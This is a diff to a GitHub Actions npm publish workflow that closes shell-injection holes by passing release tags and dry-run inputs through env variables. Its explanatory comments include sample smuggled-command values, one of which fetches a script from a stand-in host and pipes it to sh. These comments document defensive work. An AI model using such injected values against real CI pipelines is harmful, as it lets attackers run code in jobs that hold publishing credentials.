@@ -40,6 +40,22 @@ name: Publish to npm
 #       3. @gsa-sam/sam-formly
 #   - Quality gates (format, lint, three builds, tests + coverage floors,
 #     Playwright smoke test) must pass before publish.
+#   - Values that originate outside the workflow file — the release tag
+#     (`github.event.release.tag_name`), `vars.DRY_RUN`, `inputs.dry-run`,
+#     and `github.event_name` — are passed into `run:` steps through the
+#     step `env:` block and read as quoted shell variables. `${{ }}`
+#     interpolation is substituted into the generated script *text* before
+#     bash parses it, so a value carrying shell metacharacters would run as
+#     code, ahead of any validation in the step itself. The release tag is
+#     the sharpest edge: it is event payload data controlled by whoever
+#     cuts the Release, and it lands in the one job holding
+#     `id-token: write` for npm Trusted Publishing. `${{ }}` therefore
+#     belongs only in `if:` and `env:` in this file, never in a `run:`
+#     body. Runner-provided shell env vars are a different thing and are
+#     safe as-is: `"$GITHUB_SHA"` in the ancestry check is expanded by bash
+#     at runtime, not pasted into the script text, and the validator script
+#     reads `GITHUB_REF_NAME` / `GITHUB_EVENT_NAME` from `process.env`
+#     rather than from an interpolated argument.
 #
 # HITL handoff to DevSecOps:
 #   Until the Trusted Publisher connections are live, this workflow runs
@@ -86,12 +102,18 @@ jobs:
           fetch-depth: 0
 
       - name: Validate trigger safety and release ancestry
+        env:
+          # Passed via env (never `${{ }}` inside the script body) so these
+          # values arrive as data and can never be parsed as shell syntax.
+          # See the security-model note in the header.
+          EVENT_NAME: ${{ github.event_name }}
+          DISPATCH_DRY_RUN: ${{ inputs.dry-run }}
         run: |
-          if [ "${{ github.event_name }}" = "workflow_dispatch" ] && [ "${{ inputs.dry-run }}" != "true" ]; then
+          if [ "$EVENT_NAME" = "workflow_dispatch" ] && [ "$DISPATCH_DRY_RUN" != "true" ]; then
             echo "::error::Manual workflow_dispatch runs are rehearsal-only and must specify dry-run=true."
             exit 1
           fi
-          if [ "${{ github.event_name }}" = "release" ]; then
+          if [ "$EVENT_NAME" = "release" ]; then
             git fetch origin master
             if ! git merge-base --is-ancestor "$GITHUB_SHA" origin/master; then
               echo "::error::Release commit $GITHUB_SHA is not an ancestor of origin/master. Releases must be cut from master."
@@ -190,9 +212,20 @@ jobs:
           fi
 
       - name: Run ADR-0011 preflight validation (loop across all three manifests)
+        env:
+          # RELEASE_TAG is event payload data: anyone who can cut a Release
+          # controls this string. Interpolating it with `${{ }}` into the
+          # script body would substitute it into the script *text* before
+          # bash parses it, so a tag like `v1.0.0"; curl evil.sh | sh; #`
+          # would close the quote and execute — in this job, which holds
+          # `id-token: write` for npm Trusted Publishing. Pass it through
+          # env and read it as a quoted shell variable so it can only ever
+          # be a single argument to the validator.
+          EVENT_NAME: ${{ github.event_name }}
+          RELEASE_TAG: ${{ github.event.release.tag_name }}
         run: |
-          if [ "${{ github.event_name }}" = "release" ]; then
-            node scripts/validate-publish-package.mjs --tag "${{ github.event.release.tag_name }}"
+          if [ "$EVENT_NAME" = "release" ]; then
+            node scripts/validate-publish-package.mjs --tag "$RELEASE_TAG"
           else
             node scripts/validate-publish-package.mjs
           fi
@@ -211,27 +244,45 @@ jobs:
           done
 
       - name: Verify built dist packages
+        env:
+          # Same reasoning as the preflight step above: the release tag is
+          # attacker-influenced event payload data and must reach the
+          # validator as a quoted shell variable, never as script text.
+          EVENT_NAME: ${{ github.event_name }}
+          RELEASE_TAG: ${{ github.event.release.tag_name }}
         run: |
-          if [ "${{ github.event_name }}" = "release" ]; then
-            node scripts/validate-publish-package.mjs --tag "${{ github.event.release.tag_name }}"
+          if [ "$EVENT_NAME" = "release" ]; then
+            node scripts/validate-publish-package.mjs --tag "$RELEASE_TAG"
           else
             node scripts/validate-publish-package.mjs
           fi
 
       - name: Determine dry-run mode
         id: mode
+        env:
+          # NEVER interpolate these with `${{ }}` inside the script body:
+          # expression interpolation is substituted into the script *text*
+          # before bash parses it, so a DRY_RUN value such as
+          # `true"; echo PWNED; #` would execute before the boolean
+          # validation below could reject it. This job holds
+          # `id-token: write` for npm Trusted Publishing, so the blast
+          # radius is publish credentials for three public packages. Read
+          # them as quoted shell variables instead.
+          EVENT_NAME: ${{ github.event_name }}
+          DISPATCH_DRY_RUN: ${{ inputs.dry-run }}
+          VARS_DRY_RUN: ${{ vars.DRY_RUN }}
         run: |
           # Priority: workflow_dispatch input > repo/env variable DRY_RUN > default true.
           # Manual dispatch is rehearsal-only; only a published Release may
           # perform a live publish.
-          if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
-            DRY="${{ inputs.dry-run }}"
+          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
+            DRY="$DISPATCH_DRY_RUN"
             if [ "$DRY" != "true" ]; then
               echo "::error::workflow_dispatch runs must use dry-run=true. Publish a GitHub Release to run a live publish."
               exit 1
             fi
           else
-            DRY="${{ vars.DRY_RUN }}"
+            DRY="$VARS_DRY_RUN"
           fi
           # Default to the safe mode when unset.
           DRY="${DRY:-true}"
